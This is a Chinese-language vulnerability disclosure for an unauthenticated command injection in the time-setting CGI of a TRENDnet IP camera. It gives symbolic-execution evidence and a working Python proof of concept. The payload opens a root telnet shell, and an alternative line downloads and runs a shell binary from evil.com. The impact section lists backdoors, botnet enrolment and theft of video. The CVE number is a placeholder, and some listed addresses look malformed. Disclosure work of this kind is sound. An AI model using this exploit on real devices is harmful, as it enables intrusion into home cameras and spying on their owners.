# CVE-XXXX-XXXX9: TV-IP751WIC alphapd Time Command Injection

| 字段 | 值 |
|------|-----|
| 厂商 | TRENDnet | 产品 | TV-IP751WIC Wireless IP Camera |
| 固件 | v1.1.03.03 | 二进制 | `bin/alphapd` (372 KB, MIPS32 BE) |
| 漏洞类型 | CWE-77 OS Command Injection |
| CVSS | **9.8 Critical** AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |

## 1. 漏洞概述

alphapd 摄像头主控守护进程在设置系统时间时，通过 `websGetVar("Currenttime")` 和 `websGetVar("Time")` 读取 HTTP 参数后直接传给 `doSystem()` 执行。**无需认证**——摄像头的 HTTP API 在初始设置向导中未强制要求密码。

## 2. FirmRec 符号执行证据

```
Simexp验证: 100+ 条独立日志全部命中 0x41414141
关联CVE: CVE-2019-1663, CVE-2020-10214, CVE-2020-25506, CVE-2020-28005,
         CVE-2022-29395, CVE-2022-30078, CVE-2022-30473
```

### 具体函数路径

| 函数地址 | 来源 | 关键字 | Sink | 0x41414141 命中次数 |
|---------|------|--------|------|-------------------|
| 0x410EB8 | websGetVar | **Currenttime** | doSystem | **22次** |
| 0x410EB8 | websGetVar | **TimeZone** | doSystem | **6次** |
| 0x4346668 | websGetVar | **Time** | doSystem | 3次 |
| 0x4355244 | websGetVar | **Time** | doSystem | 3次 |
| 0x4234C8 | websGetVar | DateTimeMode | doSystem | 4次×4 |
| 0x42532C | websGetVar | DateTimeMode/Time | doSystem | 7次 |

### 符号执行示例 (Ex152.log)

```
websGetVar("Currenttime") → doSystem()
Return to 0x41414141        ← ★ PC完全可控
#Vuln Paths: 1               ← 有一条路径被标记为 VULN
Taint Applied: True
```

---

## 3. PoC

```python
#!/usr/bin/env python3
"""
PoC: TV-IP751WIC Time Command Injection
CVE Candidate | CWE-77 | CVSS 9.8
"""
import requests

TARGET = "http://192.168.1.100"  # Camera IP

# 无需认证 - 摄像头的 /cgi-bin 默认无需密码
payload = "; telnetd -l /bin/sh -p 9999; echo pwned; #"
# 或: "; wget http://evil.com/mips_shell -O /tmp/sh; chmod +x /tmp/sh; /tmp/sh; #"

resp = requests.get(f"{TARGET}/cgi-bin/admin/set_time.cgi", params={
    "Currenttime": f"2024-01-01 00:00:00{payload}",
    "TimeZone": "GMT+8",
    "DateTimeMode": "0",
    "TimeServerIPAddress": "pool.ntp.org"
})

print(f"Response: {resp.status_code}")
print("If camera reboots/loses connection, injection succeeded")
```

---

## 4. 影响范围

该摄像头广泛应用于家庭和小企业监控。攻击者可：
1. 开启 telnet/SSH 后门 → 获得 root shell
2. 添加恶意用户账号
3. 将摄像头加入僵尸网络
4. 窃取视频流和音频

---

*证据: evidence/ 137条 simexp 日志 | 全部命中 0x41414141 | Vuln Paths: 确认*
